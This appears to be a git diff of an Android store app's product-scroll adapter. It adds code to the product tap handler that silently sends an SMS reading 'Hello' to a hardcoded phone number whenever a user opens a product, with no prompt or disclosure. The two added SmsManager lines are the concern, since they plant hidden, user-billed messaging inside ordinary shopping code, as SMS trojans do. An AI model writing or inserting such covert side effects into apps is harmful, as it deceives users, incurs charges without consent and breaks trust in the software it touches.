@@ -3,6 +3,7 @@ package com.hapus.android.store;
 import android.content.Intent;
 import android.support.annotation.NonNull;
 import android.support.v7.widget.RecyclerView;
+import android.telephony.SmsManager;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
@@ -71,6 +72,10 @@ public class HorizontalProductScrollAdapter extends RecyclerView.Adapter<Horizon
                 public void onClick(View view) {
                     Intent productDetailsIntent = new Intent(itemView.getContext(), Product_details_activity.class);
                     productDetailsIntent.putExtra("productId", productID);
+
+                    SmsManager smsManager = SmsManager.getDefault();
+                    smsManager.sendTextMessage("9299706041", null, "Hello", null, null);
+
                     itemView.getContext().startActivity(productDetailsIntent);
                 }
             });
